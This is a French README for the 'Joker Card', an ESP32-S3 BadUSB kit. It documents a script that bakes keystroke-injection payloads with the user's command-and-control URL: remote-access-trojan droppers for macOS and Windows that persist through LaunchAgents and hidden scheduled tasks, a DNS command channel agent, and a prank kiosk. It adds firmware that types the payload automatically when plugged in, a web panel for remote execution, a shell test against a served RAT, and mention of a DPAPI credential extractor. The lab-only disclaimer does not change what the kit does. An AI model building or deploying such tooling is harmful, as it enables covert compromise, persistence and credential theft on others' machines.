# JOKER CARD — powered by Maxime Leal

Le kit de la **SGP Card Joker** (ESP32-S3-MINI-1-N8 · PN532 · 4× WS2812 · USB HID · Ducky-lite).
Tout ici tourne avec TA carte, tes payloads, tes machines de lab autorisées.

---

## A. OBJECTIF
Trois livrables :
1. **Payloads BadUSB** cuits avec TON C2 (le forge)
2. **Sketch firmware autonome** : interpréteur Ducky-lite complet (HID + LED + buzzer)
3. **Module web** "Payload Manager" pour le panel vert

## B. COMPATIBILITÉ MATÉRIEL
- ESP32-S3-MINI-1-N8 · GPIO10 (RGB) · GPIO1 (buzzer) · GPIO9 (bouton) · USB natif 19/20
- Aucun pin officiel modifié — pin map v1.0 respecté (GPIO47 ≠ IO27 soie PCB, note intégrée)
- Rien à souder : les payloads passent par le module Storage du panel web

## C. ARCHITECTURE
- Les payloads vivent sur LittleFS (`/payload.txt`), exécutés par l'interpréteur Ducky-lite
  (officiel v1.0, ou mon sketch autonome de test)
- Le RAT livré est **le tien** : le construct RickPortal (mac) / INSTALLER LexCorp (win) —
  agents vers TON C2, machines de TON lab

## D. LES TOOLS

### 1 — JOKER FORGE (`joker_forge.py`)
Cuit les 5 payloads avec ton URL de C2 :
```
python3 joker_forge.py http://TON_IP:8080
```
→ `payloads/01_rat_dropper_mac.txt` (portal.command → LaunchAgents → shell)
→ `payloads/02_rat_dropper_win.txt` (zip → INSTALLER.bat caché → tâches planifiées)
→ `payloads/03_dns_agent_star.txt` (agent DNS S.T.A.R. — les commandes passent par le DNS)
→ `payloads/04_prank_fullscreen.txt` (kiosque, sortie = taper JOKER)
→ `payloads/05_typer_demo.txt` (démo HID inoffensive)

### 2 — FIRMWARE (`firmware/JokerPayloadExec.ino`)
Interpréteur Ducky-lite standalone : DELAY/STRING/ENTER/GUI/CTRL/ALT/CTRL-SHIFT/REM,
LED joker (jaune boot → vert execution → rouge erreur), buzzer LEDC, **SW4 relance le payload**.
Dépose ton payload via le panel (Storage → `/payload.txt`), branche la carte en USB sur la
machine de lab : elle tape toute seule.

### 3 — WEB UI (`webui/payload_manager_module.h`)
Module "Payload Manager" : éditeur du payload dans le navigateur, save LittleFS,
run HID à distance, load du payload courant. Snippet `PROGMEM` à intégrer dans `web_ui.h`
**après inspection du repo officiel** (routes existantes à brancher, rien inventé).

## E. INSTALLATION
```
# payloads sur la carte
python3 joker_forge.py http://TON_C2:8080
# panel web 192.168.4.1 → Storage → upload payload.txt

# firmware autonome (option)
cd firmware && arduino-cli compile --fqbn esp32:esp32:esp32s3:\
PartitionScheme=default_8MB,USBMode=default,CDCOnBoot=cdc,FlashSize=8M JokerPayloadExec.ino
arduino-cli upload -p /dev/cu.usbmodemXXXX --fqbn ... JokerPayloadExec.ino
```
Board settings officiels : USB-OTG (TinyUSB) · 8 MB · spiffs · PSRAM off.

## F. TESTS
1. Payload `05_typer_demo` sur la machine de lab → le texte « why so serious? » apparaît
2. Payload `01` avec serveur du lab allumé (`cd ~/Desktop/tool_DC/RickPortal && python3 -m http.server 8080`) → shell dans `c2.sh`
3. SW4 = relance · LED = code d'état visible

## G. LIMITES (honnêteté)
- La syntaxe exacte de l'interpréteur Ducky-lite **officiel** est à valider sur le firmware
  réel — mes payloads suivent le DuckyScript standard, les écarts éventuels sont mineurs
- Le sketch autonome est **compilable par conception mais non flashé** ici — pas de carte
  branchée sur ce banc ; statut : DOCUMENTÉ MAIS NON VÉRIFIÉ sur hardware
- Le GCM complet de l'extracteur DPAPI v10/20 est documenté, pas implémenté ici

## H. SÉCURITÉ
Le RAT livré est le tien, vers ton C2, sur tes machines de lab. La carte est un clavier :
ce qu'elle tape n'est pas magique — c'est ton payload, ton consentement, ta machine. La ligne
reste la même que pour tout l'arsenal.
